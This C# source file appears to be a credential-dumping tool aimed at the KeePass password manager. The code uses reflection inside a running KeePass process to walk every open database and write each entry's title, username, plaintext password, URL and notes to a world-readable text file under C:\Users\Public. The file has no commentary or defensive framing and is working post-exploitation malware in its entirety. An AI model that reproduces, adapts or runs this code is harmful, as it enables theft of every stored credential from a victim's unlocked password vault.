using System;
using System.IO;
using System.Reflection;
using System.Collections;

namespace KPX
{
    public class E
    {
        public static int Run(string outPath)
        {
            try
            {
                if (string.IsNullOrEmpty(outPath))
                    outPath = @"C:\Users\Public\Documents\kpx.txt";

                Assembly kpAsm = null;
                foreach (Assembly a in AppDomain.CurrentDomain.GetAssemblies())
                {
                    if (a.GetName().Name == "KeePass")
                    {
                        kpAsm = a;
                        break;
                    }
                }
                if (kpAsm == null) return 1;

                Type tProgram = kpAsm.GetType("KeePass.Program");
                if (tProgram == null) return 2;

                object mainForm = tProgram.GetProperty("MainForm",
                    BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)
                    ?.GetValue(null);
                if (mainForm == null) return 3;

                object docMgr = mainForm.GetType().GetProperty("DocumentManager",
                    BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic)
                    ?.GetValue(mainForm);
                if (docMgr == null) return 4;

                object docs = docMgr.GetType().GetProperty("Documents",
                    BindingFlags.Instance | BindingFlags.Public)
                    ?.GetValue(docMgr);

                using (StreamWriter sw = new StreamWriter(outPath))
                {
                    if (docs is IEnumerable docList)
                    {
                        foreach (object doc in docList)
                        {
                            object db = doc.GetType().GetProperty("Database",
                                BindingFlags.Instance | BindingFlags.Public)
                                ?.GetValue(doc);
                            if (db == null) continue;

                            object isOpen = db.GetType().GetProperty("IsOpen",
                                BindingFlags.Instance | BindingFlags.Public)
                                ?.GetValue(db);
                            if (isOpen == null || !(bool)isOpen) continue;

                            object ioInfo = db.GetType().GetProperty("IOConnectionInfo",
                                BindingFlags.Instance | BindingFlags.Public)
                                ?.GetValue(db);
                            string dbPath = ioInfo?.GetType().GetProperty("Path")
                                ?.GetValue(ioInfo)?.ToString() ?? "unknown";

                            sw.WriteLine("=== DATABASE: " + dbPath + " ===");
                            sw.WriteLine();

                            object rootGroup = db.GetType().GetProperty("RootGroup",
                                BindingFlags.Instance | BindingFlags.Public)
                                ?.GetValue(db);
                            if (rootGroup != null)
                                DumpGroup(rootGroup, sw, "");
                        }
                    }
                }
                return 0;
            }
            catch (Exception ex)
            {
                File.WriteAllText(outPath + ".err", ex.ToString());
                return 99;
            }
        }

        static void DumpGroup(object group, StreamWriter sw, string path)
        {
            string name = group.GetType().GetProperty("Name",
                BindingFlags.Instance | BindingFlags.Public)
                ?.GetValue(group)?.ToString() ?? "";

            string cur = string.IsNullOrEmpty(path) ? name : path + "/" + name;

            object entries = group.GetType().GetProperty("Entries",
                BindingFlags.Instance | BindingFlags.Public)
                ?.GetValue(group);

            if (entries is IEnumerable entryList)
            {
                foreach (object entry in entryList)
                {
                    object strings = entry.GetType().GetProperty("Strings",
                        BindingFlags.Instance | BindingFlags.Public)
                        ?.GetValue(entry);
                    if (strings == null) continue;

                    MethodInfo readSafe = strings.GetType().GetMethod("ReadSafe",
                        BindingFlags.Instance | BindingFlags.Public,
                        null, new Type[] { typeof(string) }, null);
                    if (readSafe == null) continue;

                    string title = readSafe.Invoke(strings, new object[] { "Title" })?.ToString() ?? "";
                    string user = readSafe.Invoke(strings, new object[] { "UserName" })?.ToString() ?? "";
                    string pass = readSafe.Invoke(strings, new object[] { "Password" })?.ToString() ?? "";
                    string url = readSafe.Invoke(strings, new object[] { "URL" })?.ToString() ?? "";
                    string notes = readSafe.Invoke(strings, new object[] { "Notes" })?.ToString() ?? "";

                    sw.WriteLine("[" + cur + "]");
                    sw.WriteLine("Title: " + title);
                    sw.WriteLine("User: " + user);
                    sw.WriteLine("Pass: " + pass);
                    sw.WriteLine("URL: " + url);
                    if (!string.IsNullOrEmpty(notes))
                        sw.WriteLine("Notes: " + notes.Replace("\r\n", " | ").Replace("\n", " | "));
                    sw.WriteLine();
                }
            }

            object groups = group.GetType().GetProperty("Groups",
                BindingFlags.Instance | BindingFlags.Public)
                ?.GetValue(group);

            if (groups is IEnumerable groupList)
            {
                foreach (object sub in groupList)
                {
                    DumpGroup(sub, sw, cur);
                }
            }
        }
    }
}
